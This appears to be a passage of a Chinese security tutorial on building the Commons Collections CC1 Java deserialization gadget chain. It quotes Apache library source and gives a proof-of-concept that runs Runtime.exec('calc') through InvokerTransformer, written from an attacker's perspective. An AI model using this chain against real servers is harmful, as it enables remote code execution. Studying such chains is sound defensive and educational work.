<span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;  <br>            object = iTransformers[i].transform(object);  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> object;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Gets the transformers, do not modify the array.     * <span class="hljs-doctag">@return</span> the transformers  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> Commons Collections 3.1  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-type">Transformer</span>[] <span class="hljs-title function_">getTransformers</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> iTransformers;  <br>    &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure></div>
+
+<h2 id="InvokerTransformer-与命令执行"><a href="#InvokerTransformer-与命令执行" class="headerlink" title="InvokerTransformer 与命令执行"></a>InvokerTransformer 与命令执行</h2><p>实现功能吧不同的transformer类连成一个链，前一个的结果是后一个的输入，但是我们没有找到可以直接执行危险命令的地方，接下来我们看invoke的类</p>
+<p>我们首先是要发现一个能执行危险函数的地方，也就是能执行exec的地方，java里执行exec是Runtime类里面的一个方法。</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*  </span><br><span class="hljs-comment"> *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */</span><span class="hljs-keyword">package</span> org.apache.commons.collections.functors;  <br>  <br><span class="hljs-keyword">import</span> java.io.Serializable;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.FunctorException;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br>  <br><span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * Transformer implementation that creates a new object instance by reflection. ** <span class="hljs-doctag">@since</span> Commons Collections 3.0  </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $  </span><br><span class="hljs-comment"> * * <span class="hljs-doctag">@author</span> Stephen Colebourne  </span><br><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;  <br>  <br>    <span class="hljs-comment">/** The serial version */</span>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">8653385846894047688L</span>;  <br>      <br>    <span class="hljs-comment">/** The method name to call */</span>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String iMethodName;  <br>    <span class="hljs-comment">/** The array of reflection parameter types */</span>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class[] iParamTypes;  <br>    <span class="hljs-comment">/** The array of reflection arguments */</span>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] iArgs;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Gets an instance of this transformer calling a specific method with no arguments.     ** <span class="hljs-doctag">@param</span> methodName  the method name to call  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> an invoker transformer  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> Commons Collections 3.1  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Transformer</span> <span class="hljs-title function_">getInstance</span><span class="hljs-params">(String methodName)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (methodName == <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The method to invoke must not be null&quot;</span>);  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName);  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Gets an instance of this transformer calling a specific method with specific values.     ** <span class="hljs-doctag">@param</span> methodName  the method name to call  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> paramTypes  the parameter types of the method  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args  the arguments to pass to the method  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> an invoker transformer  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Transformer</span> <span class="hljs-title function_">getInstance</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (methodName == <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The method to invoke must not be null&quot;</span>);  <br>        &#125;  <br>        <span class="hljs-keyword">if</span> (((paramTypes == <span class="hljs-literal">null</span>) &amp;&amp; (args != <span class="hljs-literal">null</span>))  <br>            || ((paramTypes != <span class="hljs-literal">null</span>) &amp;&amp; (args == <span class="hljs-literal">null</span>))  <br>            || ((paramTypes != <span class="hljs-literal">null</span>) &amp;&amp; (args != <span class="hljs-literal">null</span>) &amp;&amp; (paramTypes.length != args.length))) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The parameter types must match the arguments&quot;</span>);  <br>        &#125;  <br>        <span class="hljs-keyword">if</span> (paramTypes == <span class="hljs-literal">null</span> || paramTypes.length == <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName);  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            paramTypes = (Class[]) paramTypes.clone();  <br>            args = (Object[]) args.clone();  <br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName, paramTypes, args);  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Constructor for no arg instance.     ** <span class="hljs-doctag">@param</span> methodName  the method to call  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-type">private</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName)</span> &#123;  <br>        <span class="hljs-built_in">super</span>();  <br>        iMethodName = methodName;  <br>        iParamTypes = <span class="hljs-literal">null</span>;  <br>        iArgs = <span class="hljs-literal">null</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Constructor that performs no validation.     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.  </span><br><span class="hljs-comment">     ** <span class="hljs-doctag">@param</span> methodName  the method to call  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> paramTypes  the constructor parameter types, not cloned  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args  the constructor arguments, not cloned  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-type">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;  <br>        <span class="hljs-built_in">super</span>();  <br>        iMethodName = methodName;  <br>        iParamTypes = paramTypes;  <br>        iArgs = args;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Transforms the input to result by invoking a method on the input.     ** <span class="hljs-doctag">@param</span> input  the input object to transform  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the transformed result, null if null input  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>        &#125;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();  <br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);  <br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);  <br>                  <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);  <br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);  <br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);  <br>        &#125;  <br>    &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure></div>
+<p>我们观察一下这个invoketransformer<br>他有两个构造方法，一个是传入方法名进行构造，这是是私有的，另一个是传入方法名，参数类型以及参数值进行构造，这个方法是公有的。<br>还有根据参数的不同形成的几个工厂方法<br>然后我们看他这里是怎么实现这个transformer方法的。<br>这个方法要有一个输入，根据这个输入确定Class，然后通过反射去执行这个命令</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;  <br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>    &#125;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);  <br>        <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br></code></pre></td></tr></table></figure></div>
+<p>到这一步我们就发现了我们貌似可以通过这个方法实现任意命令的一个执行，我们先写一个简单的测试一下。</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Step1</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br>        invokerTransformer.transform(runtime);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure></div>
+
+<p>我们创建一个Runtime，然后实例化一个InvokeTransformer，调用他的transformer方法这样就实现了我们执行任意命令的目的，这也就是利用链的链尾部分。</p>
+<h2 id="寻找-Transformer-的调用位置"><a href="#寻找-Transformer-的调用位置" class="headerlink" title="寻找 Transformer 的调用位置"></a>寻找 Transformer 的调用位置</h2><p>我们为了形成一个完整的攻击链，从攻击者的角度考虑，服务端只给我们提供了一个反序列化的入口，所以我们上传的是一个序列化的数据，一般来说能序列化的就是对象和集合，所以很明显我们要找谁调用了transformer这个方法。</p>
+<p>然后我们发现在TransformerMap这个类里面有三个方法都调用了这个方法。</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*  </span><br><span class="hljs-comment"> *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */</span><span class="hljs-keyword">package</span> org.apache.commons.collections.map;  <br>  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;  <br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;  <br><span class="hljs-keyword">import</span> java.io.Serializable;  <br><span class="hljs-keyword">import</span> java.util.Iterator;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br>  <br><span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * Decorates another &lt;code&gt;Map&lt;/code&gt; to transform objects that are added.  </span><br><span class="hljs-comment"> * &lt;p&gt;  </span><br><span class="hljs-comment"> * The Map put methods and Map.Entry setValue method are affected by this class.  </span><br><span class="hljs-comment"> * Thus objects must be removed or searched for using their transformed form. * For example, if the transformation converts Strings to Integers, you must * use the Integer form to remove objects. * &lt;p&gt;  </span><br><span class="hljs-comment"> * &lt;strong&gt;Note that TransformedMap is not synchronized and is not thread-safe.&lt;/strong&gt;  </span><br><span class="hljs-comment"> * If you wish to use this map from multiple threads concurrently, you must use  </span><br><span class="hljs-comment"> * appropriate synchronization. The simplest approach is to wrap this map * using &#123;<span class="hljs-doctag">@link</span> java.util.Collections#synchronizedMap(Map)&#125;. This class may throw   </span><br><span class="hljs-comment"> * exceptions when accessed by concurrent threads without synchronization.  </span><br><span class="hljs-comment"> * &lt;p&gt;  </span><br><span class="hljs-comment"> * This class is Serializable from Commons Collections 3.1.  </span><br><span class="hljs-comment"> * * <span class="hljs-doctag">@since</span> Commons Collections 3.0  </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $  </span><br><span class="hljs-comment"> ** <span class="hljs-doctag">@author</span> Stephen Colebourne  </span><br><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span>  <br>        <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractInputCheckedMapDecorator</span>  <br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;  <br>  <br>    <span class="hljs-comment">/** Serialization version */</span>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">7023152376788900464L</span>;  <br>  <br>    <span class="hljs-comment">/** The transformer to use for the key */</span>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer keyTransformer;  <br>    <span class="hljs-comment">/** The transformer to use for the value */</span>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer valueTransformer;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Factory method to create a transforming map.     * &lt;p&gt;  </span><br><span class="hljs-comment">     * If there are any elements already in the map being decorated, they  </span><br><span class="hljs-comment">     * are NOT transformed.     * Constrast this with &#123;<span class="hljs-doctag">@link</span> #decorateTransform&#125;.  </span><br><span class="hljs-comment">     ** <span class="hljs-doctag">@param</span> map  the map to decorate, must not be null  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no transformation  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no transformation  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if map is null  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Map</span> <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Factory method to create a transforming map that will transform     * existing contents of the specified map.     * &lt;p&gt;  </span><br><span class="hljs-comment">     * If there are any elements already in the map being decorated, they  </span><br><span class="hljs-comment">     * will be transformed by this method.     * Constrast this with &#123;<span class="hljs-doctag">@link</span> #decorate&#125;.  </span><br><span class="hljs-comment">     ** <span class="hljs-doctag">@param</span> map  the map to decorate, must not be null  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no transformation  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no transformation  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if map is null  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> Commons Collections 3.2  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Map</span> <span class="hljs-title function_">decorateTransform</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;  <br>        <span class="hljs-type">TransformedMap</span> <span class="hljs-variable">decorated</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);  <br>        <span class="hljs-keyword">if</span> (map.size() &gt; <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-type">Map</span> <span class="hljs-variable">transformed</span> <span class="hljs-operator">=</span> decorated.transformMap(map);  <br>            decorated.clear();  <br>            decorated.getMap().putAll(transformed);  <span class="hljs-comment">// avoids double transformation  </span><br>        &#125;  <br>        <span class="hljs-keyword">return</span> decorated;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">//-----------------------------------------------------------------------  </span><br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Constructor that wraps (not copies).     * &lt;p&gt;  </span><br><span class="hljs-comment">     * If there are any elements already in the collection being decorated, they  </span><br><span class="hljs-comment">     * are NOT transformed.     ** <span class="hljs-doctag">@param</span> map  the map to decorate, must not be null  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if map is null  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-type">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;  <br>        <span class="hljs-built_in">super</span>(map);  <br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;  <br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">//-----------------------------------------------------------------------  </span><br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Write the map out using a custom routine.     ** <span class="hljs-doctag">@param</span> out  the output stream  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> Commons Collections 3.1  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        out.defaultWriteObject();  <br>        out.writeObject(map);  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Read the map in using a custom routine.     ** <span class="hljs-doctag">@param</span> in  the input stream  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> ClassNotFoundException  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> Commons Collections 3.1  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>        in.defaultReadObject();  <br>        map = (Map) in.readObject();  <br>    &#125;  <br>  <br>    <span class="hljs-comment">//-----------------------------------------------------------------------  </span><br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Transforms a key.     * &lt;p&gt;  </span><br><span class="hljs-comment">     * The transformer itself may throw an exception if necessary.  </span><br><span 